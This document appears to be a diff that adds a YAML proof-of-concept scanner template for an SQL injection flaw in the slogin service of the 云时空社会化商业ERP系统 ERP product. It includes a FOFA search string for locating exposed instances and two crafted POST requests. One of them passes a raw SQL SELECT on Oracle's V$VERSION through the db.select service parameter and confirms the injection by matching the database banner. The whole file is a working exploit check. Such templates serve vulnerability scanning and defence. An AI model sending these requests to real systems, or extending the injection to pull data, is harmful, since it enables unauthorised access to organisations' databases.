@@ -1,0 +1,24 @@
+id: poc-yaml-yun-shi-kong-erp-system-slogin-sqli
+info:
+  name: 云时空社会化商业ERP系统 slogin SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 云时空社会化商业ERP系统
+  fofa: app="云时空社会化商业ERP系统"
+requests:
+- method: POST
+  path: /slogin/service?service=db.select
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: params=%7B%22
+  expression: status_code == 500 && contains(body,"JSONException:")
+- method: POST
+  path: /slogin/service?service=db.select
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: params=%7B%22sql%22%3A%22SELECT+%2A+FROM+V%24VERSION%22%7D
+  expression: status_code == 200 && contains(body,"Oracle Database") && contains(body,"Version")
+    && contains(body,`"fields":["BANNER"]`)
+variables: {}
+transport: http
